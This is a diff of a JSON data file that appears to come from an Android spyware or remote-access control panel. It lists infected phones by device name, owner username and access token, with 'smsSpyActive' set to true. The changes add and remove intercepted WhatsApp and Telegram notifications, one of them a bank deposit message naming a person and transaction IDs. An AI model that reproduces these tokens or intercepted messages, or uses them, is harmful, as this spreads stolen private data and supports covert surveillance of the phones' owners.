@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776774880622,
+    "lastSeen": 1776774883605,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776774879225,
+    "lastSeen": 1776774885478,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim video ke Status saya",
+        "time": "21/04 19:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776774885595
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -14394,14 +14402,6 @@
         "time": "21/04 18:51",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776772289440
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / MAHEZA DELLA ARSAWINATA\n🏦 Method: SEABANK\n💰 Amount: Rp 2.000\n💸 Fee: Rp 140\n💵 Total Payload: Rp 2.140\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421194849241413\n🏷️ System ID: FSCL15284968\n⏰ 21 Apr 2026 • 18:50 WIB\n\n#DEPOSIT #SEABANK",
-        "time": "21/04 18:51",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772289417
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776774881546,
+    "lastSeen": 1776774884486,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
